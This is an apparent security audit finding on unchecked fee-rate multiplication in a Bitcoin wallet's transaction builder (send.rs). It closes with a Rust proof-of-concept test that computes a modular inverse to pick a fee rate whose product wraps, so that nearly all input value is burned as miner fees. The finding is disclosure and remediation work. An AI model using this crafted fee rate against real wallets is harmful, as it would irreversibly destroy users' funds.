### Title
Unchecked fee-rate multiplication wraps and authorizes excessive transaction fees - (File: networks/bitcoin/src/wallet/send.rs)

### Summary
`SignableTransaction::new` calculates the required transaction fee with `fee_per_vbyte * vbytes` and `fee_per_vbyte * vbytes_with_change`, but neither multiplication is checked for overflow. [1](#0-0) [2](#0-1) 

### Finding Description
The transaction builder accepts `fee_per_vbyte` as a public `u64` parameter and derives `needed_fee` through unchecked multiplication. [3](#0-2) [4](#0-3) 

In a normal release build, an overflowing multiplication wraps modulo `2^64`, after which the wrapped value is used for both the minimum-fee check and the funds-sufficiency check. [5](#0-4) 

The actual transaction fee is not set from `needed_fee`; it is implicitly `sum(inputs) - sum(outputs)`. [6](#0-5) [7](#0-6) 

Consequently, a specially selected fee rate can make `needed_fee` wrap to a small acceptable value while the valid signed transaction still sends almost all input value to miners as a fee. [8](#0-7) 

### Impact Explanation
An untrusted transaction proposer who can influence `fee_per_vbyte` can cause the wallet to create and sign a valid transaction whose actual fee is far larger than the validated `needed_fee`. [9](#0-8) [10](#0-9) 

Because the oversized fee is paid to miners rather than to an output, the signed transaction remains spendable and consensus-valid, while wallet funds are irreversibly consumed as fees. [11](#0-10) [8](#0-7) 

### Likelihood Explanation
The flaw is reachable wherever transaction request data supplies the fee rate, and exploitation only requires choosing a rate whose multiplication by the transaction’s known virtual size wraps to a value above the minimum relay fee. [3](#0-2) [1](#0-0) 

The attacker does not need a validator role, secret material, malformed curve encoding, or multiple malicious signers; they only need to cause the wallet to construct a transaction from the supplied parameters. [3](#0-2) [12](#0-11) 

### Recommendation
Use `checked_mul` for `fee_per_vbyte * vbytes` and `fee_per_vbyte * vbytes_with_change`, and use `checked_add`/`checked_sub` for all input, payment, fee, and change totals. [13](#0-12) [14](#0-13) 

Reject any `fee_per_vbyte` whose calculated fee cannot be represented, and compare `input_sat` against independently checked `payment_sat.checked_add(needed_fee)` results. [15](#0-14) 

### Proof of Concept
The following demonstrates the arithmetic condition inside the transaction builder:

```rust
// Inside send.rs tests, so calculate_weight_vbytes and ReceivedOutput fields are accessible.
#[test]
fn wrapped_fee_rate_reports_small_fee_but_spends_large_fee() {
  let input_sats = 100_000;
  let payment_sats = DUST;
  let payments = vec![(ScriptBuf::new_p2tr_tweaked(tweaked_key), payment_sats)];

  // For a one-input/one-P2TR-output transaction this is expected to be 111;
  // calculate it rather than relying on the constant.
  let (_, vbytes) = SignableTransaction::calculate_weight_vbytes(1, &payments, None);

  // If vbytes is odd, it has an inverse modulo 2^64. Choose the wrapped fee
  // result as 2 * vbytes, which passes the minimum-fee check.
  assert_eq!(vbytes % 2, 1);
  let modulus = 1u128 << 64;
  let inverse_vbytes = mod_inverse_odd_u64(vbytes);
  let target_fee = 2u64 * vbytes;
  let malicious_fee_rate =
    (u128::from(target_fee) * u128::from(inverse_vbytes) % modulus) as u64;

  assert_eq!(malicious_fee_rate.wrapping_mul(vbytes), target_fee);

  let input = ReceivedOutput {
    offset: Scalar::ONE,
    output: TxOut {
      value: Amount::from_sat(input_sats),
      script_pubkey: ScriptBuf::new_p2tr_tweaked(tweaked_key),
    },
    outpoint: OutPoint::default(),
  };

  let tx = SignableTransaction::new(
    vec![input],
    &payments,
    None,
    None,
    malicious_fee_rate,
  ).unwrap();

  // The constructor accepted the wrapped target as the required fee.
  assert_eq!(tx.needed_fee(), target_fee);

  // Since no change output exists, the actual fee is input - payment.
  assert_eq!(tx.fee(), input_sats - payment_sats);
}
```

`mod_inverse_odd_u64` can be implemented with Newton iteration or extended Euclid; for odd `vbytes`, `pow(vbytes, -1, 1 << 64)` in Python produces the same value. [1](#0-0)
